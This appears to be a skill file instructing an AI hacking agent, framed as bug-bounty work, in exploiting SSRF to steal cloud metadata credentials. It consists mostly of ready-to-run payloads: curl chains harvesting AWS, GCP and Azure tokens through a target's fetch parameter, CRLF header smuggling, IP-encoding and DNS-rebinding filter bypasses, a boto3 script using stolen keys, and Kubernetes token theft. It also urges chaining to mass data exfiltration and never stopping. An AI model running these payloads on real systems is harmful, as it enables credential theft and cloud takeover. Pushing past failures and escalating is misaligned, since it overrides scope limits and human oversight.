---
name: hunt-metadata-ssrf
description: "Use this skill whenever you have a confirmed or suspected SSRF primitive — webhook URLs, import-from-URL features, image/avatar fetchers, PDF renderers (wkhtmltopdf/Puppeteer/Chromium), URL preview generators, link unfurlers, RSS/Atom fetchers, OAuth dynamic-client URLs, server-side iframes, SVG referencing remote refs, XXE with SYSTEM, or any user-controllable outbound HTTP from the server. Load automatically when scope mentions AWS/GCP/Azure-hosted services or when error responses leak cloud IP ranges. Only invoke if real impact potential exists — actual credential theft, instance metadata read, or pivot via stolen role. Skip theoretical findings (a blind SSRF to a non-cloud host without read-back is a different finding; this skill is for proving cloud impact)."
type: hunt
---

# Hunt: Cloud Metadata SSRF

The link-local metadata service (`169.254.169.254`) is the holy grail of SSRF on cloud-hosted apps. Steal an IAM role, harvest STS credentials, and pivot to S3/RDS/Lambda/etc. AWS IMDSv2 raised the bar but most apps still expose v1 or are vulnerable via PUT-capable SSRF chains.

## Crown Jewel Targets
- Apps running on EC2 / ECS / EKS / App Runner that fetch user-controlled URLs server-side
- GCP Compute / Cloud Run / GKE workloads with fetch features
- Azure VMs / App Service / Functions / AKS pods
- PDF renderers (wkhtmltopdf with `--enable-local-file-access`, Puppeteer in headless mode)
- Webhook deliveries (Slack-style, GitHub-style) without IP filtering
- SVG/SVGO renderers that follow external references
- Image proxies (cdn.target.com/?url=)
- XXE that allows `<!ENTITY xxe SYSTEM "http://169.254.169.254/…">`
- OAuth dynamic client registration / OIDC discovery URL fields
- Anything calling `requests.get(user_url)`, `axios.get(user_url)`, `curl $user_url`

## Detection Signals
- App fetches arbitrary URLs server-side and returns the body (or even hints — status, length, timing)
- Blind callback infrastructure (Burp Collaborator) gets a hit when you submit `http://attacker.tld`
- Error messages leaking AWS/Azure/GCP IP ranges, internal hostnames (`ip-10-0-…`), or `ec2`/`gce`/`azure` strings
- Fetch endpoint resolves DNS server-side (your DNS receives lookup from a cloud egress IP)
- Response timing differs between `127.0.0.1` and `0.0.0.0:1` (port-scan oracle)

## Attack Techniques (per cloud)

### AWS — IMDSv1 (legacy, easy)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
The role endpoint returns JSON with `AccessKeyId`, `SecretAccessKey`, `Token` — STS temp creds.

### AWS — IMDSv2 (token-required)
```
PUT http://169.254.169.254/latest/api/token  HEADER: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>  HEADER: X-aws-ec2-metadata-token: <token>
```
- Pure GET-only SSRF cannot do the PUT → IMDSv2 protects.
- BUT many SSRF primitives support arbitrary method (e.g., `?url=…` with `?method=PUT`), gopher://, or HTTP request smuggling where you smuggle a PUT.
- Also: many apps still set `HttpTokens=optional` on the instance (IMDSv2 not enforced) — v1 still works.
- IMDSv2 token also accepted as query param on some SDK paths.

### GCP
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata/computeMetadata/v1/instance/service-accounts/default/token   (short alias inside VPC)

REQUIRED HEADER: Metadata-Flavor: Google
```
Without `Metadata-Flavor: Google` the metadata server returns 403. Most SSRF primitives let you inject custom headers (via CRLF, via fetch with `headers={…}`, via `?header=…` on image proxies).

Also useful:
```
.../computeMetadata/v1/instance/service-accounts/default/identity?audience=…   (OIDC ID token)
.../computeMetadata/v1/project/attributes/                                       (ssh keys, startup-script)
.../computeMetadata/v1/?recursive=true&alt=json                                  (everything)
```

### Azure (IMDS / Managed Identity)
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
REQUIRED HEADERS: Metadata: true
```
Note `?api-version=` is required. Other useful resources:
```
?resource=https://vault.azure.net           (Key Vault)
?resource=https://graph.microsoft.com       (MS Graph)
?resource=https://storage.azure.com         (Storage)
```
App Service Managed Identity uses a different endpoint:
```
http://$IDENTITY_ENDPOINT/?api-version=2019-08-01&resource=https://vault.azure.net  HEADER: X-IDENTITY-HEADER: $IDENTITY_HEADER
```
Both endpoint and header come from env vars — leak them via local SSRF / file read first.

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```
No header required. Leaks user-data (often containing secrets), tags, region.

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>
```

### Oracle Cloud
```
http://169.254.169.254/opc/v2/instance/      HEADER: Authorization: Bearer Oracle
http://169.254.169.254/opc/v2/identity/cert.pem
```

### IBM Cloud
```
http://169.254.169.254/instance_identity/v1/token  (POST)
```

### Kubernetes — ServiceAccount token theft (when SSRF runs inside a pod)
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
https://kubernetes.default.svc/api/v1/namespaces/default/pods       (with Bearer <token>)
https://kubernetes.default.svc/api/v1/secrets                       (jackpot if RBAC is loose)
```
Kubelet read-only (deprecated but seen): `https://<node-ip>:10255/pods`
Kubelet write (catastrophic): `https://<node-ip>:10250/exec/...` (often anonymous + abusable).

## IP Bypass Tricks (when 169.254.169.254 is filtered)

| Encoding | Example |
|---|---|
| Decimal | `http://2852039166/` (=169.254.169.254) |
| Octal | `http://0251.0376.0251.0376/` |
| Hex | `http://0xa9.0xfe.0xa9.0xfe/` or `http://0xa9fea9fe/` |
| Mixed | `http://0xa9fe.43518/` |
| IPv6 mapped | `http://[::ffff:169.254.169.254]/` |
| IPv6 mapped hex | `http://[::ffff:a9fe:a9fe]/` |
| Padded zeros | `http://169.254.169.254./` (trailing dot) |
| DNS rebinding | use `rebind.network` / `1u.ms` to swap A record after first resolution |
| Redirect chain | host attacker.tld/302 → `Location: http://169.254.169.254/…` |
| DNS CNAME | `dig +short metadata.attacker.tld` → returns `169.254.169.254` |
| Enclosed alphanumeric | `http://①⑥⑨.②⑤④.①⑥⑨.②⑤④/` (rare, parser-specific) |
| AWS shortcut name | `instance-data` / `metadata.aws.internal` (sometimes resolvable inside VPC) |
| GCP shortcut | `metadata.google.internal`, `metadata` (without TLD) |

## Payloads

```bash
# AWS IMDSv1 — full credential harvest via SSRF param
SSRF="https://target.com/fetch?url="
ROLE=$(curl -s "${SSRF}http://169.254.169.254/latest/meta-data/iam/security-credentials/")
CREDS=$(curl -s "${SSRF}http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}")
echo "$CREDS"
# JSON has AccessKeyId, SecretAccessKey, Token, Expiration
```

```bash
# AWS IMDSv2 — when SSRF allows method/header override
curl "${SSRF}http://169.254.169.254/latest/api/token" \
  -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# then use token in GET

# IF only GET: try CRLF injection to smuggle PUT
SSRF="https://target.com/fetch?url=http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600"
```

```bash
# GCP — custom header injection via image proxy
curl "https://target.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&header=Metadata-Flavor:Google"
# Or via CRLF
curl "https://target.com/fetch?u=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google"
```

```bash
# Azure — IMDS with required header
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/&header=Metadata:true"
```

```python
# Validate stolen AWS creds and demonstrate blast radius
import boto3, json, sys
creds = json.loads(sys.argv[1])  # the JSON blob from IMDS
s = boto3.Session(
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['Token'],
    region_name='us-east-1')
print("Identity:", s.client('sts').get_caller_identity())
print("Buckets:", [b['Name'] for b in s.client('s3').list_buckets()['Buckets']])
# Try aws iam list-attached-role-policies to map blast radius (chain into cloud-iam-deep)
```

```bash
# Kubernetes SA token in-pod
TOK=$(curl -s "${SSRF}file:///var/run/secrets/kubernetes.io/serviceaccount/token")
curl -k -H "Authorization: Bearer $TOK" "https://kubernetes.default.svc/api/v1/namespaces/$(curl -s ${SSRF}file:///var/run/secrets/kubernetes.io/serviceaccount/namespace)/secrets"
```

```bash
# DNS rebinding template (use 1u.ms or rebind.network)
SSRF_URL="http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/"
# Service alternates A records between 127.0.0.1 and 169.254.169.254
# App's DNS check passes (sees 127.0.0.1), actual request resolves to metadata
```

## Bypass Methods
- IMDSv2 PUT required → smuggle via CRLF, HTTP request smuggling, gopher://, or method-override params
- URL parser sees `attacker.tld` but socket connects to `169.254.169.254` via DNS rebinding
- Allowlist by domain → use open redirect on allowlisted domain to bounce into metadata URL
- IP blocklist of `169.254.0.0/16` → use decimal/hex/octal IP encoding
- IP blocklist of `127.*` and `10.*` and `192.168.*` and `169.254.*` → IPv6 mapped form often slips through
- Egress firewall blocks 169.254 → look for Consul (`:8500`), AWS metadata mock services, internal proxies
- Header injection blocked → look for SSRF primitives that natively accept arbitrary headers (most image proxies, link unfurlers)
- Cloud SDK sometimes hits region-specific metadata endpoints — `imds.us-east-1.amazonaws.com` rarely filtered

## Tools
- **Burp Collaborator / interactsh / oast.live** — out-of-band callback for blind SSRF
- **SSRFmap** — https://github.com/swisskyrepo/SSRFmap — automates probes against many SSRF parameter patterns
- **gopherus** — https://github.com/tarunkant/Gopherus — generate gopher:// payloads for Redis/MySQL/SMTP exploitation
- **dnsbin / requestbin / pingb.in** — quick callback URLs
- **rebind.network / 1u.ms** — DNS rebinding services
- **smuggler** — for HTTP request smuggling enabling IMDSv2 PUT
- **boto3 / az CLI / gcloud** — credential validation
- **enumerate-iam** — https://github.com/andresriancho/enumerate-iam — map blast radius of stolen AWS creds
- **kdigger / peirates** — Kubernetes attack toolkits when SSRF leads inside a cluster
- **PortSwigger SSRF labs** — for technique drilling

## Impact
- **Critical** — stolen IAM/SA credentials → cloud-wide compromise (S3, RDS, Lambda, KMS); SA token → Kubernetes cluster takeover
- **High** — read-only metadata reveals user-data with embedded secrets, ssh keys, startup scripts
- **High** — Azure Managed Identity token → Key Vault secrets exfil
- **Medium** — metadata read of non-sensitive instance info (region, AMI) with no credential exposure
- A blind SSRF that does not reach metadata or any internal service is a separate (lower) finding. The bounty here is the credential theft + demonstrated blast radius.

## Chain Potential
- SSRF → IMDS creds → S3 bucket access (chain `hunt-s3-misconfig` enumeration) → mass data exfil
- SSRF → IMDS creds → STS AssumeRole chain → privesc (chain `cloud-iam-deep`)
- SSRF → GCP SA token → Cloud Storage / Secret Manager / GKE cluster access
- SSRF → Azure Managed Identity → Key Vault secrets → RDP/SSH on internal VMs
- SSRF → K8s SA token → cluster takeover → secrets/configmaps with prod DB creds → ATO + data breach
- Webhook SSRF + IMDSv2 PUT-smuggle → role steal → publish malicious npm via leaked CI creds

## Fallback Chain
1. Confirm SSRF egress with a Collaborator callback; record exact method/header/protocol flexibility of the primitive.
2. Hit cloud metadata for AWS, GCP, Azure in parallel (correct headers per provider, common IP encodings); on success, parse credentials and immediately validate via `sts get-caller-identity` / `gcloud auth print-access-token` / Azure `me`.
3. If 169.254.169.254 is filtered, cycle through IP encodings, IPv6-mapped, decimal, DNS rebinding, redirect chains, and provider-specific shortcut names.
4. If metadata is hardened (IMDSv2-only, no header injection), pivot to internal services (`localhost:6379` Redis, `:8500` Consul, `:9200` Elasticsearch, `kubernetes.default.svc`, `:10250` kubelet, internal admin panels) and stolen-SA-token paths inside pods — Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

Filtered subset of SSRF reports that reached cloud metadata / IMDS / GCP / Azure for credential theft.

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **SSRF using JavaScript exfilling Google Metadata** | Snapchat | $0 | H1 #530974 |
| **SSRF at app.hellosign.com → AWS private keys disclosure** | Dropbox | $4,913 | H1 #923132 |
| Full Response SSRF via Google Drive | Dropbox | $17,576 | H1 #1406938 |
| SSRF leaking internal GCP via upload [SSH keys] | Vimeo | $0 | H1 #549882 |
| Full read SSRF in evernote.com → AWS metadata + LFI | Evernote | $0 | H1 #1189367 |
| **SSRF in webhooks → AWS private keys disclosure** | Omise | $0 | H1 #508459 |
| Half-Blind SSRF in kube/cloud-controller-manager → full SSRF | Kubernetes | $5,000 | H1 |
| Unauthenticated blind SSRF in OAuth Jira controller (chained internal) | GitLab | $4,000 | H1 #398799 |
| SSRF in Autodesk Rendering → ATO (via stolen creds) | Autodesk | $0 | H1 #3024673 |
| External SSRF via FFmpeg HLS → LFR + cloud pivot | TikTok | $2,727 | H1 #1062888 |
| SSRF in graphQL → internal cloud service mapping | EXNESS | $3,000 | H1 #1864188 |
| Blind SSRF to internal services in matrix preview_link API | Reddit | $6,000 | H1 #1960765 |
| DNS Rebinding SSRF in Burp Suite MCP Server → internal | PortSwigger | $2,000 | H1 #3176157 |
| Blind SSRF on errors.hackerone.net (Sentry → AWS) | HackerOne | $3,500 | H1 #374737 |
| SSRF via Office file thumbnails | Slack | $4,000 | H1 #671935 |
| Unauthenticated SSRF jira.tochka.com → RCE confluence | QIWI | $0 | H1 #713900 |

**PROVEN patterns** (3+ reports): webhook URL → IMDSv1 → AWS keys → S3/PII dump (Omise, Dropbox HelloSign, Slack), document/render service SSRF → GCP metadata.google.internal → SSH/service-account keys (Vimeo, Snapchat, Dropbox Drive, Evernote), DNS rebinding to bypass 169.254 blocklist (PortSwigger), Kubernetes SA token via in-pod SSRF (K8s cloud-controller).

## High-Value Chains (from Reports)

1. **Webhook SSRF → IMDSv1 → AWS role creds → S3 user-data dump**
   - Omise (H1 #508459), Dropbox HelloSign (#923132, $4,913) — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returned role keys; immediately authed and dumped buckets.
2. **Document render SSRF → GCP metadata → service-account JSON / SSH keys**
   - Vimeo (#549882), Snapchat (#530974), Dropbox Drive (#1406938, $17.5k) — `metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` returned OAuth token enabling broader GCP access.
3. **DNS rebinding → bypass IMDS allowlist → cloud creds**
   - PortSwigger MCP (#3176157, $2k) — DNS that flips A record between attacker IP and 169.254.169.254 defeated initial check.
4. **K8s pod SSRF → ServiceAccount token from /var/run/secrets → cluster API → secrets**
   - Kubernetes cloud-controller-manager (H1, $5k) — Half-blind SSRF in vendor-managed cluster reached internal SA endpoint and exfiltrated tokens.
5. **Internal Confluence/Jenkins via SSRF → unauth admin → RCE → host creds → cloud takeover**
   - QIWI jira.tochka.com → confluence.bank24.int (#713900) — SSRF crossed network boundary, hit unpatched internal Atlassian, RCE that yielded instance credentials.
